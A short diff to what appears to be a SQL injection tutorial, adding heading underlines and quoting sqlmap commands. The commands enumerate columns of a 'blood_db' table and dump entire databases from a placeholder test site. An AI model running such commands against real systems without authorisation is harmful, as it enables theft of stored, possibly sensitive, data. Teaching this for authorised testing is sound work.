@@ -292,6 +292,7 @@ Once we run these commands, we should get the the tables.
 Once we have available tables, now let’s gather the columns from the table blood_db.
 
 Using GET based Method:
+----------------------
 - sqlmap -u https://testsite.com/page.php?id=7 -D blood -T blood_db --columns
 - sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns
 
@@ -328,8 +329,9 @@ Using GET based Method:
 Or we can simply dump all the available database and tables using the follwing commands.
 
 Using GET based Method:
-- sqlmap -r req.txt -D <database_name> --dump-all
-- sqlmap -r req.txt-p  -D <database_name> --dump-all
+----------------------
+- 'sqlmap -r req.txt -D <database_name> --dump-all'
+- 'sqlmap -r req.txt-p  -D <database_name> --dump-all'
 
 
 
